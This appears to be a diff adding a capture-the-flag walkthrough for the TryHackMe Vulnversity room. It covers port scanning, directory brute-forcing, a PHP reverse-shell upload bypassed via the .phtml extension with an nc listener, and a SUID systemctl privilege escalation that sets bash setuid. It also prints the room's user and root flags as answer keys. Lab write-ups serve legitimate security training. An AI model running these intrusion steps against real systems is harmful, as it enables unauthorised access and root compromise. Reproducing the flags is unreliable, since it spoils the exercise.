@@ -1,0 +1,103 @@
+THM Vulnversity
+
+tryhackme.com/room/vulnversity
+github.com/ttnovo/vuln/projects
+by TTNOVO 
+===================================================================
+IP: 10.10.104.102
+===================================================================
+If you use own VM use VPN, by using this guide, if not, go to TASK 2.
+
+1. Download your VPN file on THM if you haven’t done that already, find it and do following command: sudo openvpn FILE.ovpn
+2. then hit your password and you ready to dive in to TASK 2…
+===================================================================
+TASK 2:
+(Id like to add, ping the machine before using NMAP, sometimes they take time. Command: Ping 10.10.104.102
+
+Scan with NMAP with command, sC for scripts, Sv for versions:
+nmap -sC -sV 10.10.104.102
+
+1. Scan the box, how many ports are open?
+Answer: 6 (21,22, 139,445,3128,3333)
+2. What version of the squid proxy is running on the machine?
+Answer: 3.5.12
+3. How many ports will nmap scan if the flag -p-400 was used?
+Answer: 400
+4. Using the nmap flag -n what will it not resolve?
+Answer: DNS (Domain name system) (Do an /-n to search what this does)
+5. What is the most likely operating system this machine is running?
+Answer: Ubuntu
+6. What port is the web server running on?
+Answer: 3333
+==================================================================
+TASK 3: 
+
+Use Gobuster to find hidden sites on the webserver. (sudo apt-get install gobuster)
+You need wordlist this you find /usr/share/wordlists. You could use Nicto also if you prefer it.
+
+gobuster dir -u http://10.10.104.102:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+1. What is the directory that has an upload form page?
+Answer: /internal/
+==================================================================
+TASK 4:
+
+1. Try upload a few file types to the server, what common extension seems to be blocked?
+
+We could do this with an PHP reverse shell, obviously I could guess it would block this but lets try... 
+github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+Save it and remember the location. I didnt use Burpsuite this time, but if you wish to learn more, digg in to it!
+Its more likely to be .PHP blocked becuase it doesnt allow me to upload in PHP.
+
+Answer: .php
+
+2. Run this attack, what extension is allowed?
+Answer: .phtml
+
+make an NC lvnp and on a high port, I did take 9100. Also before uploading remember to do ip addr and find your eth0 IP adress
+and change to this one in your reverseshell file. Dont forget to rename the file to .phtml 
+You should upload this, than go to /internal/uploads from here and double click it. You should see NC respond.
+
+do an whoami, you www-data, great get the user flag!
+
+cd /home
+ls
+cd bill
+cat user.txt
+
+3. What is the name of the user who manages the webserver?
+Answer: bil
+4. What is the user flag?
+Answer:8bd7992fbe8a6ad22a63361004cfcedb
+===============================================================
+TASK 5:
+
+So for task 5... They dont actually tell how you will do, but I found this way out of many...
+find / -user root -perm -4000 -print 2>/dev/null
+it may be hard first times to see this, wow I needed to Google... But I found that systemctl sticks out...
+This is because its rare they will apear as binary.
+ 
+1. On the system, search for all SUID files. What file stands out?
+Answer: /bin/systemctl
+
+For question two, we could use this systemctl (system control) for our pupose to get root permission, lets gooo!!!
+By googling I found this and I changed the chmod aswell for adding systemctl, the result... 
+
+TF=$(mktemp).service
+echo ' [Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+
+Than simply to upgrade our shell... just write: 
+bash -p 
+YOURE ROOT Get the flag!!
+cd root
+cat root.txt
+
+2. Become root and get the last flag (/root/root.txt)
+Answer: a58ff8579f0a9270368d33a9966c7fd5
+==========================================================
